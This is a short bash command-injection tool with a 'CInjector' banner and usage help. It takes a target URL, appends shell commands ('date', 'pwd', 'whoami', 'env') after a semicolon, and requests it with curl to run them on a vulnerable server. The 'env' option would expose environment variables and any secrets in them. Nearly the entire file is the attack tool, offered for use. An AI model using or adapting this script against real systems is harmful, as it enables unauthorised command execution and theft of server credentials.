#!/bin/bash
echo "


 .d8888b. 8888888           d8b                   888                    
d88P  Y88b  888             Y8P                   888                    
888    888  888                                   888                    
888         888   88888b.  8888  .d88b.   .d8888b 888888 .d88b.  888d888 
888         888   888  88b 888  d8P  Y8b d88P     888   d88  88b 888P   
888    888  888   888  888  888 88888888 888      888   888  888 888     
Y88b  d88P  888   888  888  888 Y8b.     Y88b.    Y88b. Y88..88P 888     
  Y8888P  8888888 888  888  888   Y8888    Y8888P  Y888  Y88P  888     
                            888                                          
                           d88P                                          
                         888P                                           



"
sleep 2s
#read -p "Input the vulnerable URL: " URL
if [[ $1 == "-h" ]] || [[ $1 == "--help" ]];then
        echo "Usage"
        echo "------------------------------"
        echo "    -u url to attack"
        echo "Commands"
        echo "------------------------------"
        echo "    -d date"
        echo "    -w whoami"
        echo "    -p pwd"
        echo "    -e env"
        echo "------------------------------"
        echo "Example"
        echo "./cinjector -u <url> -p"
        echo "./cinjector -u <url> -w"
        echo "------------------------------"

elif [[ $1 == "-u" ]] && [[ $3 == "-d" ]];then
        curl "$2;date"
elif [[ $1 == "-u" ]] && [[ $3 == "-p" ]];then
        curl "$2;pwd"
elif [[ $1 == "-u" ]] && [[ $3 == "-w" ]];then
        curl "$2;whoami"
elif [[ $1 == "-u" ]] && [[ $3 == "-e" ]];then
        curl "$2;env"
else
        echo "If you need help type -h or --help"
        echo "Usage ./resolve.sh -u <url> -p"
fi
